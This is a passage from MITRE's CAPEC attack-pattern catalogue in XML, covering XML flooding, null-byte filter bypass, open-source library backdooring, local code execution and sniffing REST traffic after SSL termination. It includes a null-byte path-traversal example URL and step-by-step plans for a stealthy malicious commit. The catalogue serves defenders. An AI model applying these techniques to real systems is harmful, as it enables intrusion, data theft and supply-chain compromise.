               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances, Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="528" Name="XML Flood" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary may execute a flooding attack using XML messages with the intent to deny legitimate users access to a web service. These attacks are accomplished by sending a large number of XML based requests and letting the service attempt to parse each one. In many cases this type of an attack will result in a XML Denial of Service (XDoS) due to an application becoming unstable, freezing, or crashing.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>XDoS is most closely associated with web services, SOAP, and Rest, because remote service requesters can post malicious XML payloads to the service provider designed to exhaust the service provider's memory, CPU, and/or disk space. The main weakness in XDoS is that the service provider generally must inspect, parse, and validate the XML messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that XDoS targets. This attack exploits the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends.</html:p>
         </ns0:Extended_Description>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>XML Denial of Service (XML DoS)</ns0:Term>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Likelihood_Of_Attack>Low</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125">
               <ns0:Exclude_Related Exclude_ID="512" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.</ns0:Description>
               <ns0:Technique>Use an automated tool to record all instances of URLs to process XML requests.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how the application processes XML requests.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>An adversary crafts input data that may have an adverse effect on the operation of the web service when the XML data sent to the service.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Launch a resource depletion attack] The attacker delivers a large number of XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.</ns0:Description>
               <ns0:Technique>Send a large number of crafted XML messages to the target URL.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target must receive and process XML transactions.</ns0:Prerequisite>
            <ns0:Prerequisite>An adverssary must possess the ability to generate a large amount of XML based messages to send to the target service.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">Denial of service</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>A large amount of data is passed to the XML parser possibly making it crash or otherwise unavailable to end users.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Resource Consumption</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Provide for network flow control and traffic shaping to control access to the resources.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1499.002</ns0:Entry_ID>
               <ns0:Entry_Name>Endpoint Denial of Service:Service Exhaustion Flood</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1498.001</ns0:Entry_ID>
               <ns0:Entry_Name>Network Denial of Service:Direct Network Flood</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Alternate_Terms, Consequences, Description, Example_Instances, Execution_Flow, Indicators, Likelihood_Of_Attack, Mitigations, Prerequisites, Related_Attack_Patterns, Skills_Required, Typical_Severity</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="53" Name="Postfix, Null Terminate, and Backslash" Abstraction="Detailed" Status="Draft">
         <ns0:Description>If a string is passed through a filter of some kind, then a terminal NULL may not be valid. Using alternate representation of NULL allows an adversary to embed the NULL mid-string while postfixing the proper data so that the filter is avoided. One example is a filter that looks for a trailing slash character. If a string insertion is possible, but the slash must exist, an alternate encoding of NULL in mid-string may be used.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</ns0:Technique>
               <ns0:Technique>Manually inspect the application to find entry points.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the "Explore" phase as a target list and injects postfix null byte(s) followed by a backslash to observe how the application handles them as input. The adversary is looking for areas where user input is placed in the middle of a string, and the null byte causes the application to stop processing the string at the end of the user input.</ns0:Description>
               <ns0:Technique>Try different encodings for null such as \0 or %00 followed by an encoding for the backslash character.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Remove data after null byte(s)] After determined entry points that are vulnerable, the adversary places a null byte(s) followed by a backslash such that they bypass an input filter and remove data after the null byte(s) in a way that is beneficial to them.</ns0:Description>
               <ns0:Technique>If the input is a directory as part of a longer file path, add a null byte(s) followed by a backslash at the end of the input to try to traverse to the given directory.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Null terminators are not properly handled by the filter.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">An adversary needs to understand alternate encodings, what the filter looks for and the data format acceptable to the target API</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>Null characters are observed by the filter. The filter needs to be able to understand various encodings of the Null character, or only canonical data should be passed to it.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Properly handle Null characters. Make sure canonicalization is properly applied. Do not pass Null characters to the underlying APIs.</ns0:Mitigation>
            <ns0:Mitigation>Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>A rather simple injection is possible in a URL:</html:p>
               <html:div style="margin-left:1em;" class="informative">http://getAccessHostname/sekbin/<html:br />helpwin.gas.bat?mode=&amp;draw=x&amp;file=x&amp;module=&amp;locale=[insert relative path here]<html:br />[%00][%5C]&amp;chapter=</html:div>
               <html:p>This attack has appeared with regularity in the wild. There are many variations of this kind of attack. Spending a short amount of time injecting against Web applications will usually result in a new exploit being discovered.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="158" />
            <ns0:Related_Weakness CWE_ID="172" />
            <ns0:Related_Weakness CWE_ID="173" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="697" />
            <ns0:Related_Weakness CWE_ID="707" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="538" Name="Open-Source Library Manipulation" Abstraction="Detailed" Status="Stable">
         <ns0:Description>Adversaries implant malicious code in open source software (OSS) libraries to have it widely distributed, as OSS is commonly downloaded by developers and other users to incorporate into software development projects. The adversary can have a particular system in mind to target, or the implantation can be the first stage of follow-on attacks on many systems.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Low</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="444">
               <ns0:Exclude_Related Exclude_ID="437" /><ns0:Exclude_Related Exclude_ID="515" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Determine the relevant open-source code project to target] The adversary will make the selection based on various criteria:<html:ul>
                     <html:li>The open-source code currently in use on a selected target system.</html:li>
                     <html:li>The depth in the dependency graph of the open source code in relationship to other code bases in use on the target system. Choosing an OSS lower in the graph decreases the probability of discovery, but also decreases the scope of its use within the target system.</html:li>
                     <html:li>The programming language in which the open source code is implemented. Different languages present different opportunities for using known software weaknesses.</html:li>
                     <html:li>The quality of processes in place to make a contribution. For instance, some contribution sites use static and dynamic analysis tools, which could increase the probability of discovery.</html:li>
                     <html:li>The security requirements necessary to make a contribution. For instance, is the ownership lax allowing unsigned commits or anonymous users.</html:li>
                  </html:ul>
               </ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Develop a plan for malicious contribution] The adversary develops a plan to contribute malicious code, taking the following into consideration:<html:ul>
                     <html:li>The adversary will probably avoid easy-to-find software weaknesses, especially ones that static and dynamic analysis tools are likely to discover.</html:li>
                     <html:li>Common coding errors or missing edge cases of the algorithm, which can be explained away as being accidental, if discovered, will be preferred by the adversary.</html:li>
                     <html:li>Sometimes no identity is required to make a contribution. Other options are to steal an existing identity or create one. When creating a new identity, strike a balance between too little or too much detail. Using an stolen identity could cause a notification to be sent to the actual user.</html:li>
                  </html:ul>
               </ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Execute the plan for malicious contribution] Write the code to be contributed based on the plan and then submit the contribution. Multiple commits, possibly using multiple identities, will help obscure the attack. Monitor the contribution site to try to determine if the code has been uploaded to the target system.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Access to the open source code base being used by the manufacturer in a system being developed or currently deployed at a victim location.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="High">Advanced knowledge about the inclusion and specific usage of an open source code project within system being targeted for infiltration.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Example_Instances>
            <ns0:Example>An adversary with access to an open source code project introduces a hard-to-find bug in the software that allows under very specific conditions for encryption to be disabled on data streams. The adversary commits the change to the code which is picked up by a manufacturer who develops VPN software. It is eventually deployed at the victim's location where the very specific conditions are met giving the adversary the ability to sniff plaintext traffic thought to be encrypted. This can provide to the adversary access to sensitive data of the victim.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="494" />
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1195.001</ns0:Entry_ID>
               <ns0:Entry_Name>Supply Chain Compromise: Software Dependencies and Development Tools</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-439" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, Description, Example_Instances, Execution_Flow, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2023-01-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2021-06-24">Open Source Libraries Altered</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="549" Name="Local Execution of Code" Abstraction="Meta" Status="Stable">
         <ns0:Description>An adversary installs and executes malicious code on the target system in an effort to achieve a negative technical impact. Examples include rootkits, ransomware, spyware, adware, and others.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Knowledge of the target system's vulnerabilities that can be capitalized on with malicious code.The adversary must be able to place the malicious code on the target system.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>The means by which the adversary intends to place the malicious code on the system dictates the tools required. For example, suppose the adversary wishes to leverage social engineering and convince a legitimate user to open a malicious file attached to a seemingly legitimate email. In this case, the adversary might require a tool capable of wrapping malicious code into an innocuous filetype (e.g., PDF, .doc, etc.)</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Other</ns0:Impact>
               <ns0:Note>Depending on the type of code executed by the adversary, the consequences of this attack pattern can vary widely.</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Employ robust cybersecurity training for all employees.</ns0:Mitigation>
            <ns0:Mitigation>Implement system antivirus software that scans all attachments before opening them.</ns0:Mitigation>
            <ns0:Mitigation>Regularly patch all software.</ns0:Mitigation>
            <ns0:Mitigation>Execute all suspicious files in a sandbox environment.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>BlueBorne refers to a set of nine vulnerabilities on different platforms (Linux, Windows, Android, iOS) that offer an adversary the ability to install and execute malicious code on a system if they were close in proximity to a Bluetooth enabled device. One vulnerability affecting iOS versions 7 through 9 allowed an attacker to overflow the Low Energy Audio Protocol since commands sent over this protocol are improperly validated and gain the elevated permissions of the Bluetooth stack. These vulnerabilities were a result of poor validation and were patched shortly after their exposure in 2017, but many non-updated devices remain vulnerable.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2015-11-09</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Methods_of_Attack, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="57" Name="Utilizing REST's Trust in the System Resource to Obtain Sensitive Data" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack utilizes a REST(REpresentational State Transfer)-style applications' trust in the system resources and environment to obtain sensitive data once SSL is terminated.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>Rest applications premise is that they leverage existing infrastructure to deliver web services functionality. An example of this is a Rest application that uses HTTP Get methods and receives a HTTP response with an XML document. These Rest style web services are deployed on existing infrastructure such as Apache and IIS web servers with no SOAP stack required.</html:p>
            <html:p>Unfortunately from a security standpoint, there frequently is no interoperable identity security mechanism deployed, so Rest developers often fall back to SSL to deliver security. In large data centers, SSL is typically terminated at the edge of the network - at the firewall, load balancer, or router. Once the SSL is terminated the HTTP request is in the clear (unless developers have hashed or encrypted the values, but this is rare). The adversary can utilize a sniffer such as Wireshark to snapshot the credentials, such as username and password that are passed in the clear once SSL is terminated. Once the adversary gathers these credentials, they can submit requests to the web service provider just as authorized user do. There is not typically an authentication on the client side, beyond what is passed in the request itself so once this is compromised, then this is generally sufficient to compromise the service's authentication scheme.</html:p>
         </ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="157" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Find a REST-style application that uses SSL] The adversary must first find a REST-style application that uses SSL to target. Because this attack is easier to carry out from inside of a server network, it is likely that an adversary could have inside knowledge of how services operate.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Insert a listener to sniff client-server communication] The adversary inserts a listener that must exist beyond the point where SSL is terminated. This can be placed on the client side if it is believed that sensitive information is being sent to the client as a response, although most often the listener will be placed on the server side to listen for client authentication information.</ns0:Description>
               <ns0:Technique>Run wireshark or tcpdump on a device that is on the inside of a firewall, load balancer, or router of a network and capture traffic after SSL has been terminated</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Gather information passed in the clear] If developers have not hashed or encrypted data sent in the sniffed request, the adversary will be able to read this data in the clear. Most commonly, they will now have a username or password that they can use to submit requests to the web service just as an authorized user</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Opportunity to intercept must exist beyond the point where SSL is terminated.</ns0:Prerequisite>
            <ns0:Prerequisite>The adversary must be able to insert a listener actively (proxying the communication) or passively (sniffing the communication) in the client-server communication path.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">To insert a network sniffer or other listener into the communication stream</ns0:Skill>
